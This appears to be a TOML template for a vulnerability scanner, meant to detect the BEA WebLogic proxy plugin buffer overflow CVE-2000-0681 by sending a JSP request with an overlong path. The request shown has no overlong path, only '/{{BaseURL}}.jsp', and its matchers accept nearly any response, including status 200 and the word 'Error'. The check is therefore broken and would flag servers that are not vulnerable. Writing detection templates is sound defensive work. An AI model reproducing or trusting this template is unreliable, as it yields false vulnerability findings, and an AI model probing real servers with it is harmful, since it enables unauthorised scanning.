[info]
author = "AVE"
description = "检测 BEA WebLogic Server 代理插件缓冲区溢出漏洞（CVE-2000-0681）。通过向目标服务器发送包含超长路径的 .JSP 扩展名特制 URL 请求，触发代理插件缓冲区溢出，验证漏洞是否存在。"
id = "POC-AVE-2000-1409"
name = "BEA WebLogic Server 代理插件缓冲区溢出 PoC"
severity = "critical"
tags = ["cve-2000-0681"]
vuln_id = [
    "CVE-2000-0681",
    "AVE-2000-1409",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [
    500,
    502,
    503,
    200,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error",
    "Exception",
    "500",
    "Internal Server Error",
    "proxy",
]
